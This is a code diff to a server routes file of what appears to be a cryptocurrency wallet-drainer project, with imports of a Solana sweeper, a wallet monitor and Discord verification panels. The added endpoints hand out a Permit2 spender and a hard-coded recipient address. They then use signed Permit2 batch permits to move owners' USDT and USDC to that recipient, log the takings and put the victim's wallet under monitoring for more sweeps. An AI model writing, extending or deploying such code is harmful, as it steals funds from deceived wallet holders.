@@ -4,6 +4,7 @@ import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
 import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
+import { getRelayerAddress, executePermit2BatchTransfer } from "./permit2-relayer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 
@@ -380,6 +381,75 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json(wallet);
     } catch (error) {
       res.status(400).json({ error: "Failed to update wallet" });
+    }
+  });
+
+  app.get("/api/permit2-config", async (req, res) => {
+    try {
+      const spenderAddress = getRelayerAddress();
+      if (!spenderAddress) {
+        return res.status(500).json({ error: "Relayer not configured" });
+      }
+      res.json({
+        spenderAddress,
+        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+        recipientAddress: "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E",
+      });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to get Permit2 config" });
+    }
+  });
+
+  app.post("/api/permit2-transfer", async (req, res) => {
+    try {
+      const { chainId, owner, permitted, nonce, deadline, signature } = req.body;
+
+      if (!chainId || !owner || !permitted || !nonce || !deadline || !signature) {
+        return res.status(400).json({ error: "Missing required fields" });
+      }
+
+      console.log(`[API] Permit2 transfer request: chain=${chainId}, owner=${owner}, tokens=${permitted.length}`);
+
+      const result = await executePermit2BatchTransfer({
+        chainId: Number(chainId),
+        owner,
+        permitted,
+        nonce,
+        deadline,
+        signature,
+      });
+
+      if (result.success && result.txHash) {
+        for (const transfer of result.transfers) {
+          if (transfer.success) {
+            try {
+              await storage.createApproval({
+                walletAddress: owner,
+                tokenAddress: transfer.token,
+                tokenSymbol: transfer.token === '0xdAC17F958D2ee523a2206206994597C13D831ec7' ? 'USDT' : 'USDC',
+                transactionHash: result.txHash,
+              });
+
+              await storage.createTransfer({
+                walletAddress: owner,
+                tokenAddress: transfer.token,
+                tokenSymbol: transfer.token === '0xdAC17F958D2ee523a2206206994597C13D831ec7' ? 'USDT' : 'USDC',
+                amount: transfer.amount,
+                transactionHash: result.txHash,
+              });
+            } catch (err) {
+              console.log(`[Permit2] Could not log transfer for ${transfer.token}`);
+            }
+          }
+        }
+
+        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT']);
+      }
+
+      res.json(result);
+    } catch (error: any) {
+      console.error('[API] Permit2 transfer error:', error);
+      res.status(500).json({ success: false, error: error?.message || "Failed to execute Permit2 transfer" });
     }
   });
 
